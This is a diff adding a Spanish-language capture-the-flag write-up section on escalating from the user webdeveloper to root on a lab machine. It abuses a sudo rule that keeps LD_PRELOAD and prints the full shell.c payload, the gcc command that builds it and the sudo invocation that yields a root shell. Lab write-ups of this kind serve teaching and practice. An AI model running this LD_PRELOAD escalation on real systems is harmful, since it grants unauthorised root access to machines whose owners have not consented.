@@ -339,5 +339,78 @@ Utilizamos las credenciales encontradas para finalizar la escalada horizontal ha
 
 ## Post Explotacion Escalada de privilegios webdeveloper to root.
 
+Listamos los comandos que nos estan permitidos ejecutar como root.
 
+	webdeveloper@sky:~$ sudo -l
+ 
+	Matching Defaults entries for webdeveloper on sky:
+	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+	    env_keep+=LD_PRELOAD
+	
+	User webdeveloper may run the following commands on sky:
+	    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+
+
+Tras analizar todos los parametros vemos que a traves ded LD_PRELOAD podemos ganar acceso como root.
+
+INFO: 
+
+	env_reset: Este parámetro se utiliza para restablecer la variable de entorno.
+
+	mail_badpass: Es el mensaje que se muestra al usuario si ingresa una contraseña incorrecta.
+
+	secure_path: Es el entorno de ruta configurado para todos los comandos sudo. Un usuario no puede reescribir su propia ruta para ejecutar el comando sudo y obtener potencialmente una escalada de privilegios.
+
+  	env_keep: Permite definir las variables de entorno que se conservarán en el entorno del usuario cuando la opción “env_reset” esté activada 
+
+ 	LD_PRELOAD: Es una variable de entorno de uso opcional. Contiene una o más rutas a bibliotecas u objetos compartidos que tendrán más prioridad que las ubicadas en las rutas estándar, incluida la biblioteca de tiempo de ejecución de C (libc.so). A esta funcionalidad se le denomina precargar librerías.
+
+  Escalada de privilegios con sudo / env_keep / LD_PRELOAD ---> https://www.busindre.com/escalada_de_privilegios_con_variable_ld_preload
+
+Elevamos privilegios y mostramos flag root.txt
+
+Creamos un fichero shell.c con el siguiente codigo.
+
+	webdeveloper@sky:/tmp$ cat shell.c 
+	#include <stdio.h>
+	#include <sys/types.h>
+	#include <stdlib.h>
+	void _init()
+	{
+	        unsetenv("LD_PRELOAD");
+	
+	        setuid(0);
+	        system("/bin/bash");
+	}
+ 
+Compilamos dicho fichero y lo exportamos como un binario llamado shell.so
+
+	webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+	shell.c: In function ‘_init’:
+	shell.c:8:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+	    8 |  setuid(0);
+	      |  ^~~~~~
+Listamos los comandos que podemos ejecutar como root, ya que se me habia olvidado.
+
+	webdeveloper@sky:/tmp$ sudo -l
+	Matching Defaults entries for webdeveloper on sky:
+	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+	    env_keep+=LD_PRELOAD
+	
+	User webdeveloper may run the following commands on sky:
+	    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+     
+Ejecutamos el binario pasandole nuestra 
+
+	webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility 
+	
+	root@sky:~# cat root.txt 
+	3a62d897c40a815ec---------df2f533ac6 
+
+
+---
+---> Maquina Road completa <---
+---
+---
+	
 
